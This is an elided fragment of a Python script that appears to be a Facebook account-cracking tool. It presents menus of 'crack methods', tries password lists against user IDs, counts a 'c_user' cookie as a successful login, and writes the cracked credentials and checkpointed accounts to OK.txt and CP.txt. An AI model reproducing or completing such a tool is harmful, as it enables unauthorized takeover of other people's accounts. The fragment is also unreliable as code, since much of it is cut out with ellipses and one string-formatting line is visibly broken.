...
class __crack__:
	...
	def plerr(self):
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							AAMIR_BALOCH('[•] Result CP saved to CP.txt')
							AAMIR_BALOCH('\n\tCrack Processing...\n')
							AAMIR_BALOCH('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					AAMIR_BALOCH('\n01.) Metode b-api ')
					AAMIR_BALOCH('02.) Metode mbasic ')
					AAMIR_BALOCH('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			IMTIAZ_AKING('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			AAMIR_BALOCH(' [1] AAMIR Method 1 ')
			AAMIR_BALOCH(' [2] AAMIR Method 2  [ Pro ]')
			IMTIAZ_BALOCH(' [3] AAMIR Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				IMTIAZ_AKING('\r\033[1;92m[Successful-AAMIR] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					...
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					IMTIAZ_AKING('\r\033[1;91m[Checkpoint-AAMIR] %s | %s  %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					...
					pass
				IMTIAZ_AKING('\r\033[1;91m[Checkpoint-AAMIR] %s | %s%s      ' % (user,pw,tahun(user)))
				wrt = '%s - %s%s'%(user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
